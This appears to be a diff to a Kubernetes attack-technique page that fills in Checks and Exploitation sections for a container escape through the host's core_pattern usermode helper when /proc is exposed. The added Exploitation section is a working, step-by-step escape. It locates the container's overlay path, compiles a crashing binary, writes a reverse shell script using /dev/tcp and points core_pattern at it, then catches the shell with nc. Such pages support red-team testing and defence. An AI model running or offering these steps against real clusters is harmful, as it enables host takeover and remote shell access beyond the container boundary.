@@ -1,6 +1,6 @@
 # CE_UMH_CORE_PATTERN
 
-Container escape via the core_pattern usermode_helper (UMH) in the case of an exposed `/proc` mount.
+Container escape via the `core_pattern` `usermode_helper` in the case of an exposed `/proc` mount.
 
 | Source                                    | Destination                           | MITRE                            |
 | ----------------------------------------- | ------------------------------------- |----------------------------------|
@@ -18,11 +18,65 @@ See the [example pod spec](../../test/setup/test-cluster/attacks/CE_UMH_CORE_PAT
 
 ## Checks
 
-TODO
+Determine mounted volumes within the container as per [VOLUME_MOUNT](./VOLUME_MOUNT.md#checks). If the host `/proc/sys/kernel` (or any parent directory) is mounted, this attack will be possible. Example below.
+
+```bash
+$ cat /proc/self/mounts
+
+...
+proc /hostproc proc rw,nosuid,nodev,noexec,relatime 0 0
+...
+```
 
 ## Exploitation
 
-TODO
+First find the path of the container’s filesystem on the host. This can be done by retrieving the current mounts (see [VOLUME_MOUNT](./VOLUME_MOUNT.md#checks)). Looks for the `upperdir` value of the overlayfs entry associated with containerd:
+
+```bash
+$ cat /etc/mtab
+...
+overlay / overlay rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/27/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/71/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/71/work 0 0
+...
+
+# Store path in a variable for future use
+$ OVERLAY_PATH=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/71/fs
+```
+
+Oneliner alternative:
+
+```bash
+export OVERLAY_PATH=$(cat /proc/mounts | grep -oe upperdir=.*, | cut -d = -f 2 | tr -d , | head -n 1)
+```
+
+Next create a mini program that will crash immediately and generate a kernel coredump. For example:
+
+```bash
+echo 'int main(void) {
+	char buf[1];
+	for (int i = 0; i < 100; i++) {
+		buf[i] = 1;
+	}
+	return 0;
+}' > /tmp/crash.c && gcc -o crash /tmp/crash.c
+```
+
+Compile the program and copy the binary into the container as crash. Next write a shell script to be triggered inside the container’s file system as `shell.sh`:
+
+```bash
+# Reverse shell
+REVERSE_IP=$(hostname -I | tr -d " ") && \
+echo '#!/bin/sh' > /tmp/shell.sh
+echo "sh -i >& /dev/tcp/${REVERSE_IP}/9000 0>&1" >> /tmp/shell.sh && \
+chmod a+x /tmp/shell.sh
+```
+
+Finally write the `usermode_helper` script path to the `core_pattern` helper path and trigger the container escape:
+
+```bash
+cd /hostproc/sys/kernel
+echo "|$OVERLAY_PATH/tmp/shell.sh" > core_pattern
+sleep 5 && ./crash & nc -l -vv -p 9000
+```
 
 ## Defences
 
